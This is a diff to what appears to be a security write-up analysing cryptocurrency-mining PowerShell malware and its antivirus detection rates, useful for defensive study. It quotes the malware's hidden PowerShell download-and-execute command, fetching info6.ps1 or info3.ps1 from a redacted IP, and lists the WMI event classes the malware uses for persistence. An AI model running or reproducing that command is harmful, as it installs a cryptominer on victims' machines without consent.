@@ -11,10 +11,18 @@ Currently, cryptocurrency mining malware with file name info6.ps1 is being propa
 
 In the page www.virustotal.com, 16 of 59 antivirus detect the files info6.ps1 and info3.ps1 on February 12, 2018 as a malware, however, once the code has been executed on your computer, only 1 of 59 antivirus I detect it, but without creating a solution on the affected computers.
 
+
+
 ### ANALYSIS
 The malware is downloaded from different IP addresses by means of the script identifying the type of architecture:
-### DO NOT EXECUTE THE FALLOWING COMMAND
+#### DO NOT EXECUTE THE FALLOWING COMMAND
 
 ```
 cmd /c powershell.exe -NoP -NonI -W Hidden "if((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64')){IEX(New-Object Net.WebClient).DownloadString('http://IP /info6.ps1')}else{IEX(New-Object Net.WebClient).DownloadString('http://IP/info3.ps1')}"
+```
+#### The malware creates persistence stored in classes:
+```
+__FilterToConsumerBinding
+CommandLineEventConsumer
+__EventFilter –filter
 ```
